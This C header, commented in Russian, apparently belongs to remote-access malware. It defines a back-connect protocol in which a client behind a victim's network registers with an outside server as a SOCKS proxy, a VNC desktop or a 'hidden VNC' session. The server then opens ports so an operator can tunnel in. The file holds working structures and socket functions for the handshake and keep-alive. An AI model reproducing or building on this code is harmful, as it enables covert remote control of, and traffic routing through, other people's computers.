#pragma  once

#pragma pack(push)
#pragma pack(1)

// типы бэк-клиентов, которые могут обслуживаться сервером
enum
{
	backsocks = 0x11,
	backvncdesktop,
	backvnchidden,
};

// команды, отправляемые бэк-клиентом серверу
enum
{
	BackHelloCmd = 0x09,
	BackNewConnection,
	BackKeepConnection
};

// статусы, отправляемые сервером бэк-клиенту
enum
{
	BackHelloOK = 0x99,
	BackHelloFail,
	BackHelloRetry,
};

typedef struct
{
	unsigned int size;				// размер пакета
	unsigned int cmd;				// команда бэк-серверу
	unsigned int type;				// тип бэк-клиента
	unsigned char idlen;			// длина идентификатора клиента
	unsigned char id[1];			// идентификатор клиента, нужно выделять память соответствующего размера
} TInitialRequest, *PInitialRequest;

typedef struct
{
	unsigned int status;			// код ответа сервера
	unsigned int unique;			// уникальные данные для каждого из клиентов
	unsigned int userport;			// порт, открытый сервером для клиента ("наружу")
	unsigned int backport;			// порт, открытый сервером для бэк-клиента ("внутрь")
} TInitialAnswer, *PInitialAnswer;

typedef struct
{
	unsigned int status;			// запрос клиента / ответ сервера
	unsigned int unique;			// уникальное число для каждого бэклиента
} TKeepAliveMessage;

PInitialRequest CommonGetInitialRequest(LPCSTR ClientId)
{
	unsigned char idlen = strlen(ClientId);
	unsigned int structlen = sizeof(TInitialRequest) + idlen;

	PInitialRequest Result = (PInitialRequest)hAlloc(structlen);
	if (Result)
	{
		memset(Result, 0, structlen);
		Result->size = structlen;
		Result->cmd = BackHelloCmd;
		Result->idlen = idlen;
		memcpy(Result->id, ClientId, idlen);
	}

	return Result;
};

// выделение и заполнение структуры для приветственного сообщения серверу
// по окончании работы со структурой память надо освободить вызовом hFree
PInitialRequest BackVncGetInitialRequest(LPCSTR ClientId, unsigned int ClientType)
{
	PInitialRequest Result = CommonGetInitialRequest(ClientId);
	if (Result)
		Result->type = ClientType;
	return Result;
};

#define TimeoutDefaultMsec 5000
#define TimeoutDefaultSec (TimeoutDefaultMsec / 1000)
#define TimeoutExtendedMsec 30000
#define TimeoutExtendedSec (TimeoutExtendedMsec / 1000)
#define TimeoutPingMsec (5 * 60 * 1000)

// Установка таймаута (чтение + запись) для сокета
void SetTimeout(SOCKET sock, int timeout)
{
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
}

SOCKET GetBackServerConnect(SOCKADDR_IN * pServerAddr, LPCSTR ClientId, DWORD ClientType, WORD * pBackPort, WORD * pUserPort, DWORD * pUnique)
{
	BOOL ok = FALSE;

	TInitialAnswer BuffRecv = { 0 };
	PInitialRequest BuffSend = BackVncGetInitialRequest(ClientId, ClientType);

	if (!BuffSend)
		return INVALID_SOCKET;

	SOCKET ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET != ServerSocket)
	{
		if (0 == connect(ServerSocket, (LPSOCKADDR)pServerAddr, sizeof(SOCKADDR_IN)))
		{
			DWORD dwOne = 1;
			if (0 == setsockopt(ServerSocket, IPPROTO_TCP, TCP_NODELAY, (PCHAR)&dwOne, sizeof(dwOne)))
			{
				SetTimeout(ServerSocket, TimeoutExtendedMsec);

				if (BuffSend->size == send(ServerSocket, (PCHAR)BuffSend, BuffSend->size, 0))
				{
					if (sizeof(BuffRecv) == recv(ServerSocket, (PCHAR)&BuffRecv, sizeof(BuffRecv), 0))
					{
						if (BackHelloOK == BuffRecv.status)
						{
							if (pBackPort)
								*pBackPort = LOWORD(BuffRecv.backport);
							if (pUserPort)
								*pUserPort = LOWORD(BuffRecv.userport);
							if (pUnique)
								*pUnique = BuffRecv.unique;

							ok = TRUE;
						}
					}
				}
			}
		}
	}

	if (!ok)
	{
		shutdown(ServerSocket, SD_BOTH);
		closesocket(ServerSocket);
		ServerSocket = INVALID_SOCKET;
	}

	hFree(BuffSend);
	return ServerSocket;
}

SOCKET GetBackClientConnect(SOCKADDR_IN * pServerAddr)
{
	BOOL ok = FALSE;

	SOCKET ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET != ClientSocket)
	{
		if (0 == connect(ClientSocket, (LPSOCKADDR)pServerAddr, sizeof(SOCKADDR_IN)))
		{
			DWORD dwOne = 1;
			if (0 == setsockopt(ClientSocket, IPPROTO_TCP, TCP_NODELAY, (PCHAR)&dwOne, sizeof(dwOne)))
			{
				SetTimeout(ClientSocket, TimeoutExtendedMsec);
				ok = TRUE;
			}
		}
	}

	if (!ok)
	{
		shutdown(ClientSocket, SD_BOTH);
		closesocket(ClientSocket);
		ClientSocket = INVALID_SOCKET;
	}

	return ClientSocket;
}

#pragma pack(pop)